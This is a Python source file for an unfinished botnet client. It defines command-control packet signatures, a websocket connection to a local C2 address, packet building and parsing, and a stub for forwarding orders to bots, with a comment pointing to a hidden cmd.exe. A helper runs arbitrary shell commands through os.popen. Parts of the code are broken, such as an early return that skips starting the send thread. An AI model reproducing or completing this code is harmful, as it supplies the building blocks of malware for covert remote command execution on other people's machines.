#region [ DEPENDENCY IMPORTS ]

import websocket
import time
import json
import subprocess
try:
  import thread
except ImportError:
  import _thread as thread

#endregion

#region [ CONSTANTS AND VARIABLES ]

BotnetRemoteAddress = "ws://localhost:1234"
BotnetCommandControls = [
  "\x23\x1a\x20\x17", #Master -> Command Control         [  Unicast  ]
  "\x27\x1c\x24\x19", #Command Control -> Bot            [  Unicast  ]
  "\xff\x1c\xfe\x1b", #Bot -> Command Control            [  Unicast  ]
  "\x9b\x1c\x66\x19", #Command Control -> Master         [  Unicast  ]
  "\x9b\x9b\x9d\xff"  #Master -> Command Control -> All  [ Broadcast ]
]

#endregion

#region [ WEBSOCKET EVENTS ]

def on_message(ws, message):
  print("Received: " + message)

def on_error(ws, error):
  print(error)

def on_close(ws):
  print("### closed ###")

def on_open(ws):
  def run(*args):
      for i in range(3):
          time.sleep(1)
          ws.send("Hello %d" % i)
      time.sleep(1)
      ws.close()
  return None
  thread.start_new_thread(run, ())

def entry_point():
  if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp(
      BotnetRemoteAddress, 
      on_message=on_message, 
      on_error=on_error, 
      on_close=on_close, 
      on_open=on_open
    )
    ws.run_forever()

#endregion

def SignatureCheck(m: str):
  if (len(m) < 4):
    return False
  s1 = ord(m[0:1])
  s2 = ord(m[1:2])
  e1 = ord(m[-2:-1])
  e2 = ord(m[-1:])
  return (s1 % (e1 + 1) == s2 % (e2 + 1))

def BuildResponsePacket(targObj, cmdCtlIdx, resCode, message):
  msgSignature = BotnetCommandControls[cmdCtlIdx]
  payload = { "code": resCode, "msg": message, "data": targObj }
  return msgSignature[0:2] + json.dumps(payload, separators=(',', ':')) + msgSignature[-2:]

def FwdCommandControlToBot(payload, fingerprint):
  # {
  #   shellcode: "C:\\Windows\\System32\\cmd.exe",
  #   visible: false
  # }
  print(payload, fingerprint)
  pass

def OnPacketReceived(m):
  msig = m[0:2] + m[-2:]
  m = m[2:-2]
  try:
    payload = json.loads(m)
  except Exception:
    return False
  if (msig == BotnetCommandControls[1]):
    FwdCommandControlToBot(m, payload["data"]["MasterFingerprint"])
  return True

#OnPacketReceived('\x27\x1c{"data": {"MasterFingerprint":"ABC1BCDF"}}\x24\x19')





import os

def ShellExecute(command: str, callback: callable):
  try:
    stream = os.popen(command)
    stream.encoding = 'utf-8'
    callback(stream.read())
  except Exception:
    callback(None)

def onSuccess(data):
  print(data)

ShellExecute('echo Ola Mundo', onSuccess)